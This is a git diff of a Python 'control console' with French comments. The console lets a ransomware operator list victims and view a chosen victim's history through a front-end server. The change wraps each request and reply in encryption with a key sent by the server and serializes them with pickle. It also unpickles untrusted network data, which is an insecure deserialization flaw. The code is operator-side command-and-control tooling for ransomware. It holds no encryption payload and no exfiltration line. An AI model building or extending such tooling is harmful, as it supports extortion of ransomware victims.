@@ -10,7 +10,6 @@ from utile import security
 import utile.configgetter as config
 from utile import message
 import pickle
-import binascii
 
 
 def main():
@@ -26,8 +25,8 @@ def main():
     # hasAsked 1 Before = Check si il a demander un listing avant
     # de vouloir check un historique.
     hasAsked = False
-    key = receive_data(s)
-    print(key)
+    key_f = receive_data(s)
+    print(key_f)
     while choix != '4':
         # On demande un choix plus cohérent basé sur le menu plus haut
         print('CONSOLE DE CONTRÔLE'
@@ -43,13 +42,18 @@ def main():
             # On demande au serveur frontale de lister les victimes
             # Lui va interroger la DB Sqlite
             d = message.list_victim_req()
+            r = security.crypt(d, key_f)
+            payload_f = pickle.dumps(r)
             #s.send(d.encode('utf-8'))
-            send_data(s, d)
+            send_data(s, payload_f)
             # On récupère la réponse en écoutant
             data = receive_data(s)
+            cryptMsg = pickle.loads(data)
+            clearMsg = security.decrypt(cryptMsg, key_f)
+            #security.decrypt(data, key_f)
             #data_e = security.decrypt(data, key)
             print('LISTING DES VICTIMES DU RANSOMWARE\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-            print(data)
+            print(clearMsg)
             print('\n')
         elif choix == '2':
             if hasAsked:
@@ -58,13 +62,16 @@ def main():
                 id = input('Merci de préciser un ID pour consulter l''historique : ')
                 # On transmet l'ID au serveur frontale
                 d = message.history_req(id)
+                r = security.crypt(d, key_f)
+                payload = pickle.dumps(r)
                 #s.send(bytes(str(d), 'utf-8'))
-                send_data(s, d)
+                send_data(s, payload)
                 # On écoute la réponse
-                #data_h = s.recv(2048).decode('utf-8')
                 data_h = receive_data(s)
+                cryptMsg = pickle.loads(data_h)
+                clearMsg = security.decrypt(cryptMsg, key_f)
                 # On reçoit l'historique...
-                print(str(data_h) +"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+                print(str(clearMsg) +"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
             else:
                 print("ERREUR : Veuillez d'abord lister les victimes!")
         elif choix == '3':
@@ -76,9 +83,13 @@ def main():
             # On prévient le serveur qu'on ferme la connexion avant de la fermer
             # Afin de garder des traces (logs)
             #s.send(bytes(message.close_connexion(), 'utf-8'))
-            send_data(s, message.close_connexion())
+            r = security.crypt(message.close_connexion(), key_f)
+            payload = pickle.dumps(r)
+            send_data(s, payload)
             data = receive_data(s)
-            print(str(data)+"\n")
+            cryptMsg = pickle.loads(data)
+            clearMsg = security.decrypt(cryptMsg, key_f)
+            print(str(clearMsg)+"\n")
             # On break et la connexion se ferme en sortant du break
             break
     s.close()
@@ -110,3 +121,4 @@ def fill_payload():
 
 if __name__ == '__main__':
     main()
+
